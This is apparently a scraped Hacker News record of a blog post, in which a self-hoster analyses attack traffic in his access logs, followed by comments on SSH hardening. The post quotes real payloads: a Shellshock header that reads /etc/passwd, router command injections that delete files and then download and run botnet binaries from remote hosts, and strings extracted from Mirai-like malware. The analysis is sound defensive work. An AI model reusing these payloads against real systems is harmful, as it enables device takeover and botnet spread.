[
  {
    "id": 39165711,
    "title": "Unveiling the Dangers of Self-Hosting: Analyzing Security Vulnerabilities and Targeted Attacks",
    "originLink": "https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/",
    "originBody": "Programming I looked through attacks in my access logs. Here's what I found Nish Tahir Jan 27, 2024 17 min I've been self-hosting for over a decade. It's freeing because I own my data, and do not depend on any platform other than my cloud host, which I can easily switch off. Self-hosting gives much insight into what it takes to run a cloud service. Anyone who's had some practice doing this will likely tell you that the internet is a dangerous place. 🖖 If you found this helpful or insightful leave a comment to let me know, or follow me on Mastodon - @nish@social.nishtahir.com Exposing any IP onto the public internet immediately invites a flood of malicious traffic[1]. While it's undesirable there's a lot to learn from this traffic so I poked through my access logs to see what sorts of attacks I've been hit with recently. Note: I'm not a security expert. I'm just a curious developer who likes to poke around so please take any assertions I make with a grain of salt. I wasn't sure what the value would be in redacting the IP addresses of bad guys but I redacted them anyway erring on the side of caution. Additionally, I've redacted some of the more colorful language used by the attackers which included poor language such as slurs. Credential and configuration discovery The most common attacks by a wide margin are directory traversal attacks in search of credentials. The most common appears to be in search of .env which usually contains application secrets. [23/Jan/2024:03:41:01 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/laravel/.env\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0\" \"-\" [23/Jan/2024:05:19:23 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/backend/.env\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\" \"-\" [23/Jan/2024:06:07:05 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/api/.env\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\" \"-\" [23/Jan/2024:06:11:20 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/.env\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\" \"-\" [25/Jan/2024:12:14:47 +0000] 404 - GET http xxx.xxx.xxx.xxx \"//.env\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Go-http-client/1.1\" \"-\" Additionally, attackers are looking for other common files that contain credentials. In my sample, they seem to be looking for AWS credentials and configuration files, as well as Git repositories. [23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/aws.yml\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\" \"-\" [23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/.env.bak\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\" \"-\" [23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/info.php\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\" \"-\" [23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/.aws/credentials\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\" \"-\" [23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/config/aws.yml\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\" \"-\" [23/Jan/2024:12:10:17 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/.git/config\" [Client xxx.xxx.xxx.xxx] [Length 552] [Gzip -] \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4859.172 Safari/537.36\" \"-\" Other attacks seem to be looking for common directories that may have been accidentally exposed by the administrator. I have to guess that the names are guesses based on common names. I'd be curious to learn more about what their success rate is. Interestingly, the user agents for these attacks mention Mozlila/5.0 which as far as I can tell is a typo of Mozilla/5.0. A search on GitHub (ignoring results attempting to block the user agent) hints that this is likely a typo that was made in a common tool that has been copied and pasted around[2]. [22/Jan/2024:21:03:33 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/old/\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\" \"-\" [22/Jan/2024:21:03:33 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/new/\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\" \"-\" [22/Jan/2024:21:03:35 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/test/\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\" \"-\" [22/Jan/2024:21:03:36 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/backup/\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\" \"-\" [22/Jan/2024:21:03:36 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/temp/\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\" \"-\" The attackers also seem to be looking for common remote access and configuration tools. [22/Jan/2024:15:43:25 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/actuator/gateway/routes\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\" \"-\" [23/Jan/2024:00:14:28 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/hudson\" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] \"Mozilla/5.0 zgrab/0.x\" \"-\" [23/Jan/2024:03:33:44 +0000] 400 - GET http xxx.xxx.xxx.xxx \"/ui/login.action\" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\" \"-\" [23/Jan/2024:14:20:05 +0000] 200 - GET http xxx.xxx.xxx.xxx \"/?XDEBUG_SESSION_START=phpstorm\" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\" \"-\" The lesson here seems to be to expose the absolute bare minimum to the public internet. If you don't need it, don't expose it. If you must expose tools or directories, add some layer of authentication and if possible restrict access to specific IP addresses because bad actors will be looking for it. Shellshock Next, we've got a bunch of attacks that seem to be exploiting the Shellshock[3] vulnerability. [24/Jan/2024:12:02:50 +0000] 200 - GET http xxx.xxx.xxx.xxx \"/\" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" This vulnerability exploits Webservers that execute CGI scripts with a vulnerable bash version by allowing an attacker to execute arbitrary commands[4][5]. When a CGI program starts, it sets environment variables with the content of the request, of note is HTTP_USER_AGENT[6]. When the characters () { :; }; are included, bash interprets that as a function that needs to be executed. In this specific attack, the bad guy sent this function as the user agent. () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd Let's break it down further. () { ignored; };: This part defines a function in Bash. The content inside the curly braces is the function body. The ignored command is a placeholder; it doesn't affect the execution but was likely included to prevent syntax errors. echo Content-Type: text/html; echo ;: These commands are part of the function body. They set the Content-Type header of the HTTP response to \"text/html\" and echo an empty line. /bin/cat /etc/passwd: This is the malicious command embedded within the function. It attempts to use the cat command to display the contents of the /etc/passwd file, which contains user account information. If the attack was successful, the attacker would theoretically gain access to my user credentials as well as have a mechanism to execute arbitrary code on the server. Like the directory traversal attack, the attacker guesses common directories and paths looking for an endpoint that responds favorably. [24/Jan/2024:12:02:51 +0000] 400 - GET http xxx.xxx.xxx.xxx \"/cgi-bin/status\" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" [24/Jan/2024:12:02:51 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/cgi-bin/stats\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" [24/Jan/2024:12:02:52 +0000] 400 - GET http xxx.xxx.xxx.xxx \"/cgi-bin/test\" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" [24/Jan/2024:12:02:52 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/cgi-bin/status/status.cgi\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" [24/Jan/2024:12:02:53 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/test.cgi\" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" [24/Jan/2024:12:02:53 +0000] 400 - GET http xxx.xxx.xxx.xxx \"/debug.cgi\" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" [24/Jan/2024:12:02:54 +0000] 400 - GET http xxx.xxx.xxx.xxx \"/cgi-bin/test-cgi\" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36\" \"() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" LuCI Injection [23/Jan/2024:17:26:43 +0000] 404 - GET http xxx.xxx.xxx.xxx \"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh)\" [Client xxx.xxx.xxx.xxx] [Length 552] [Gzip -] \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/xxx.xxx.xxx.xxx Safari/537.36\" \"-\" This time we've got an attack that seems to be targeting the LuCI web interface for OpenWRT routers[7]. The attack attempts to inject a command into the country field of a form that downloads and executes a shell script that is hosted remote server. Let's break it down. The malicious code is in the URL which has been URL encoded. Decoding the URL makes it easier to read. /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh) Breaking it down, /cgi-bin/luci/;stok=/locale: This is the path to a CGI script in the LuCI interface. LuCI is a web-based interface for OpenWRT routers and similar embedded devices. ?form=country&operation=write&country=: These are parameters passed to the CGI script. $(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh): This is a bash substitution command intended to be executed and the output is substituted into the URL. The command is trying to cd into the /tmp folder, delete all files, download a shell script from a remote server, and execute it. Please do not try what I am about to do yourself. At this point in my investigation, I have no idea what the script contains or what it does. I'm taking a calculated risk and have taken measures to keep myself safe. If you're not sure what you're doing, attempting to do the same could cause you to end up with a compromised machine. Downloading the script to investigate further, I discovered that the attacker aimed to download and execute an additional binary. cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lol http://xxx.xxx.xxx.xxx/mips; chmod +x lol; ./lol tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lmao http://xxx.xxx.xxx.xxx/mpsl; chmod +x lmao; ./lmao tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ██████ http://xxx.xxx.xxx.xxx/x86_64; chmod +x ██████; ./██████ tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ███ http://xxx.xxx.xxx.xxx/arm; chmod +x ███; ./███ tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O █████ http://xxx.xxx.xxx.xxx/arm5; chmod +x █████; ./█████ tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ██████ http://xxx.xxx.xxx.xxx/arm6; chmod +x ██████; ./██████ tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████ http://xxx.xxx.xxx.xxx/arm7; chmod +x ████; ./████ tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████ http://xxx.xxx.xxx.xxx/i586; chmod +x ████; ./████ tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kekw http://xxx.xxx.xxx.xxx/i686; chmod +x kekw; ./kekw tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O what http://xxx.xxx.xxx.xxx/powerpc; chmod +x what; ./what tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kys http://xxx.xxx.xxx.xxx/sh4; chmod +x kys; ./kys tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████eater http://xxx.xxx.xxx.xxx/m68k; chmod +x ████eater; ./████eater tplink cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O blyat http://xxx.xxx.xxx.xxx/sparc; chmod +x blyat; ./blyat tplink The binaries appear to be named after the architecture of the target device which makes sense since the attacker may not know what architecture the device is running on. This would give them the most surface area to work with. (Note: I censored names because the attacker renamed the binaries to common slurs) I proceeded to download a binary incompatible with my environment as an additional precaution and installed Ghidra to investigate further. Looking through the binary only had 3 functions without a lot of string data. However, there was a large segment of data that looked like this. 00107eb6 45 ?? 45h E 00107eb7 43 ?? 43h C 00107eb8 7c ?? 7Ch00107eb9 50 ?? 50h P 00107eba 52 ?? 52h R 00107ebb 4f ?? 4Fh O 00107ebc 54 ?? 54h T 00107ebd 5f ?? 5Fh _ 00107ebe 57 ?? 57h W 00107ebf 52 ?? 52h R 00107ec0 49 ?? 49h I 00107ec1 54 ?? 54h T 00107ec2 45 ?? 45h E 00107ec3 20 ?? 20h 00107ec4 66 ?? 66h f 00107ec5 61 ?? 61h a 00107ec6 69 ?? 69h i 00107ec7 6c ?? 6Ch l 00107ec8 65 ?? 65h e 00107ec9 64 ?? 64h d 00107eca 2e ?? 2Eh . 00107ecb 0a ?? 0Ah 00107ecc 00 ?? 00h 00107ecd 0a ?? 0Ah 00107ece 00 ?? 00h 00107ecf 24 49 6e ds \"$Info: This file is packed with the UPX executable packer http://upx.sf.net 66 6f 3a 20 54 68 00107f1e 24 49 64 ds \"$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All rights reserved 3a 20 55 50 58 20 00107f6a 90 ?? 90h 00107f6b 90 ?? 90h This segment stood out indicating that it's an embedded ELF binary that has been packed with UPX. Some quick research indicated that it's often misused by malware authors to obfuscate and compress their binaries[8]. As long as the malware author didn't modify the UPX header[9] or packed binary, we should be able to use UPX to unpack the binary. root:~# upx -d mips Ultimate Packer for eXecutables Copyright (C) 1996 - 2018 UPX 3.95 Markus Oberhumer, Laszlo Molnar & John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 93732 $(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)$(echo HUAWEIUPNP) POST /ctrlt/DeviceUpgrade_1 HTTP/1.1 Connection: keep-alive Accept: */* Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\" Content-Length: %s/%s ██████ got malware'd What stands out this time is M-SEARCH with the ST header. This is a UPnP command looking for devices that support the DIAL protocol[10] on the network. Based on the accompanying XML payload it looks like the malware is programmed to scan for Huawei devices on the network that are vulnerable to command injection. This appears to have been identified as being part of the Mirai botnet[11]. I tried to download the referenced yeye.mips however the file didn't appear to be available when I attempted to fetch it. Perhaps the file is only available at certain times of the day or only responds to certain headers or user agents? Running nmap on the server revealed that there were only 2 open ports nmap xxx.xxx.xxx.xxx Nmap scan report for 25port.org (xxx.xxx.xxx.xxx) Host is up (0.21s latency). Not shown: 998 closed tcp ports (reset) PORT STATE Service 22/tcp open ssh 646/tcp filtered ldp So this is where this journey came to an end. Zyxel Injection [23/Jan/2024:17:56:29 +0000] 400 - GET http localhost \"/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://xxx.xxx.xxx.xxx/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;\" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] \"-\" \"-\" This time we have a shell command in the URL of a GET request. The command contains a bunch of ${IFS} shell substitutions which we can clean up to make it easier to read. /bin/zhttpd/ cd /tmp; rm -rf *mips*; wget http://xxx.xxx.xxx.xxx/huhu.mips; chmod 777 huhu.mips; ./huhu.mips zyxel.selfrep; This appears to be exploiting zhttpd which a quick search points out is an exploit available in Zyxel devices[12]. Like the previous exploit, I decided to download the binary and poke around in Ghidra. Fortunately this time, the binary was not packed and as a result see what strings were contained to get a sense of what it was intended to do. Looking through the strings a few items stood out. 004266a4 SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr \"SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr\" ds 004266c8 M-SEARCH * HTTP/1.1 HOST: xxx.xxx.xxx.xxx:1900 MAN: \"ssdp:discover\" MX: 1 ST: urn:dial-multiscreen-org:service:dial:1 USER-AGENT: Google Chrome/60.0.3112.90 Windows \"M-SEARCH * HTTP/1.1\\rHOST: xxx.xxx.xxx.xxx:1900\\rMAN: \\\"ssdp:discover\\\"\\rMX: 1\\rST: urn:dial-multiscreen-org:service:dial:1\\rUSER-AGENT: Google Chrome/60.0.3112.90 Windows\\r\\r\" ds ... 00426fd0 HTTP/1.1 200 OK \"HTTP/1.1 200 OK\" ds 00426fe0 skyljne.arm \"skyljne.arm\" ds 00426fec skyljne.arm5 \"skyljne.arm5\" ds 00426ffc skyljne.arm6 \"skyljne.arm6\" ds 0042700c skyljne.arm7 \"skyljne.arm7\" ds 0042701c skyljne.mips \"skyljne.mips\" ds 0042702c skyljne.mpsl \"skyljne.mpsl\" ds 0042703c skyljne.x86_64 \"skyljne.x86_64\" ds 0042704c skyljne.sh4 \"skyljne.sh4\" ds 00427058 $(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/linuxxx -r /huhu.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.huawei)$(echo HUAWEIUPNP) \"$(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/linuxxx -r /huhu.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.huawei)$(echo HUAWEIUPNP)\" ds 00427234 POST /ctrlt/DeviceUpgrade_1 HTTP/1.1 Another DIAL protocol scan. Looking for vulnerable Huawei devices trying to download huhu.mips presumably as a form of self-replication. 0042763c POST /goform/set_LimitClient_cfg HTTP/1.1 Cookie: user=admin time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://xxx.xxx.xxx.xxx/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm *mpsl*; \"POST /goform/set_LimitClient_cfg HTTP/1.1\\rCookie: user=admin\\r\\rtime1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://xxx.xxx.xxx.xxx/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm *mpsl*;\\r\\r\" ds Another standout was this command. which appear to be targetting routers according to this post by Akamai[13] To exploit this vulnerability, an attacker can send the following HTTP POST request to the \"/goform/set_LimitClient_cfg\" URL: ... Ensure that the \"Cookie\" header is set to \"user=admin\" since the program has no special checks for authentication or authorization. This means that no prior authentication is required to exploit the vulnerability. At this point, we can conclude that this is likely an agent of the Mirai botnet. However, some sources also mention that it could be associated with the Linux Medusa[14] as well. Conclusion This is barely scratching the surface of my logs. There are dozens of other exploits that are being attempted daily I could poke through but this post has already gone long enough. This experience does highlight the importance of keeping devices, especially IoT devices up to date, and if at all possible keep them off the public internet. If they must be exposed, keep them isolated as much as possible to their own VLAN. Vaughan-Nichols, S. (2018) Your website is under constant attack, ZDNET. Available at: https://www.zdnet.com/article/your-website-is-under-constant-attack/ (Accessed: January 26, 2024). ↩︎ The Mozlila User agent bot (no date) Trunc Logging. Available at: https://trunc.org/learning/the-mozlila-user-agent-bot (Accessed: January 26, 2024). ↩︎ CGI (no date) Hacktricks.xyz. Available at: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi (Accessed: January 26, 2024). ↩︎ INE (no date) Lab walkthrough - shockin’ shells: ShellShock (CVE-2014-6271), INE, Inc. Available at: https://ine.com/blog/shockin-shells-shellshock-cve-2014-6271 (Accessed: January 26, 2024). ↩︎ Graham-Cumming, J. (2014) Inside Shellshock: How hackers are using it to exploit systems, The Cloudflare Blog. Available at: https://blog.cloudflare.com/inside-shellshock (Accessed: January 26, 2024). ↩︎ Garshol, L. (No date) Priv.no. Available at: https://www.garshol.priv.no/download/text/http-tut.html (Accessed: January 26, 2024). ↩︎ LuCI on lighttpd (2013) OpenWrt Wiki. Available at: https://openwrt.org/docs/guide-user/luci/luci.on.lighttpd (Accessed: January 26, 2024). ↩︎ A Simple UPX Malware Technique (no date) Mossé Security. Available at: https://www.mosse-security.com/2020/09/29/upx-malware-evasion-technique.html (Accessed: January 26, 2024). ↩︎ How to prevent “upx -d” on an UPX packed executable? (no date) Reverse Engineering Stack Exchange. Available at: https://reverseengineering.stackexchange.com/questions/3323/how-to-prevent-upx-d-on-an-upx-packed-executable (Accessed: January 26, 2024). ↩︎ Carbaugh, J. (no date) DIAL examples. Avaialble at: https://gist.github.com/jcarbaugh/e08dcfe61ece0e7eea12 (Accessed: January 26, 2024). ↩︎ Cybercure (2023) Analysis of — kuchi mama malware, Medium. Available at: https://medium.com/@cybercure/analysis-of-kuchi-mama-malware-c2e42cc005e4 (Accessed: January 27, 2024). ↩︎ Zyxel unauthenticated LAN remote code execution ≈ packet storm (no date) Packetstormsecurity.com. Available at: https://packetstormsecurity.com/files/171422/Zyxel-Unauthenticated-LAN-Remote-Code-Execution.html (Accessed: January 25, 2024). ↩︎ Akamai.com (2023) Akamai SIRT Security Advisory: CVE-2023-26801 Exploited to Spread Mirai Botnet Malware. Available at: https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet (Accessed: January 27, 2024). ↩︎ Our selection of alerts on honeypots: report 5 – march 2023 (2023) TEHTRIS. Available at: https://tehtris.com/en/blog/our-selection-of-alerts-on-honeypots-report-5-march-2023/ (Accessed: January 26, 2024). ↩︎",
    "commentLink": "https://news.ycombinator.com/item?id=39165711",
    "commentBody": "I looked through attacks in my access logs (nishtahir.com)436 points by thunderbong 20 hours agohidepastfavorite242 comments pferde 17 hours agoAn interesting thing that I've noticed is that some of the attackers watch the Certificate Transparency logs for newly issued certificates to get their targets. I've had several instances of a new server being up on a new IP address for over a week, with only a few random probing hits in access logs, but then, maybe an hour after I got a certificate from Let's Encrypt, it suddenly started getting hundreds of hits just like those listed in the article. After a few hours, it always dies down somewhat. The take-away is, secure your new stuff as early as possible, ideally even before the service is exposed to the Internet. reply KronisLV 15 hours agoparent> The take-away is, secure your new stuff as early as possible, ideally even before the service is exposed to the Internet. Honestly it feels like you'll need at least something like basicauth in front of your stuff from the first minutes it's publicly exposed. Well, either that, or run on your own CA and use self-signed certs (with mTLS) before switching over. For example, when some software still has initial install/setup screens where you create the admin user, connect to the DB and so on, as opposed to specifying everything initially in the environment variables, config files, or other more specialized secret management solutions. reply p_l 14 hours agorootparentGenerally I'd recommend not exposing anything unless you deployed the security for it. Just SSH scanning can be a big issue. reply psanford 14 hours agorootparentA big issue how? If you block password auth, ssh scanning is a nonissue. reply aunderscored 13 hours agorootparentUnless an attack on the sshd is employed. Which is also possible reply psanford 9 hours agorootparentPre-auth sshd vulnerabilities are extremely rare and are not what ssh scanners are looking for. reply p_l 9 hours agorootparentprevUntil a junior from another project enables password-based root logins because Juniper team that was on site to help them install beta-version of some software they collaborated on asked them to. Few days after they asked to redirect an entire subnet to their rack. And yes, you still need to remember to close password logins or at least pick serious password if you need them. Helps to have no root login over SSH and normal users that aren't defaults for some distro... reply psanford 8 hours agorootparentIt sounds like your organization has a bunch of problems. I'm sorry to hear that. But I don't think you can really blame those on ssh. There are plenty of organizations and individuals that can competently run ssh directly on the internet (on port 22) with zero risk to \"ssh scanners.\" reply p_l 8 hours agorootparentI am not blaming this on SSH (also, no longer in that org for many years). I am just pointing out (also in few other, off-site discussions), that one should not even think of exposing a port before finishing locking it down. Because sometimes people forget, even experienced people (including myself), and sometimes that's enough (I think someone few weeks ago submitted a story which involved getting pwned through accidentally exposed postgres?). And there's enough people who get it wrong for various reasons that lowest of low script kiddies can profit buying ready-made extortion kits on chinese forums, getting a single VM with windows to run them, and extort money from gambling/gameserver sites. Not to mention all the fun stuff if you search for open VNC/RDP. reply bradknowles 12 hours agorootparentprevDDoS attack on your sshd? reply psanford 9 hours agorootparentAre we just speculating? SSH scanners are not sources of DDoS. Large companies have ssh bastions on the internet and do not worry about ssh DDoS. Its not really a thing that happens. You don't need to freak out if you see a bunch of failed ssh auth attempts in your logs. Just turn off password based authentication and rest easy. reply koito17 8 hours agorootparentAgreed. Another thing you can do to drastically reduce the amount of bots hitting your sshd is to listen on a port that is not 22. In my experience, this reduces ~90% of the clutter in my logs. (Disclaimer: this may not be the case for you or anyone else) reply TacticalCoder 8 hours agorootparentJust to reduce the crap in the log and also because I can, I have my SSH servers (not saying what their IPs are) using a very effective measure: traffic is dropped from the entire world, except for the CIDR blocks, which I put in ipsets, of the five ISPs over three countries I could reasonably be in when I need to access the SSH servers. And if I'm really, say, in China or Russia an really need to access one of my servers through SSH, I can use a jump host in one of the three countries that I allow. So effectively: DROPping traffic from 98% of the planet. Boom. reply Fnoord 2 hours agorootparentI don't want to be able to auth whilst physically in authoritarian regimes. If I had to be physically there it'd be via burner devices. reply bradknowles 7 hours agorootparentprevDeny by default, allow only those sources that are considered trustworthy. And frequently re-evaluate who and what should be considered trustworthy. reply aborsy 5 hours agorootparentOr close the ports, and install an agent that phones out such as Tailscale or twingate. reply PLG88 51 minutes agorootparentThis is the way, outbound only connections so you can stop all external unauthenticated attacks. I wrote a blog 2 years back comparing zero trust networking using Harry Potter analogies... what we are describing is making our resources 'invisible' to silly muggles - https://netfoundry.io/demystifying-the-magic-of-zero-trust-w... reply Fnoord 2 hours 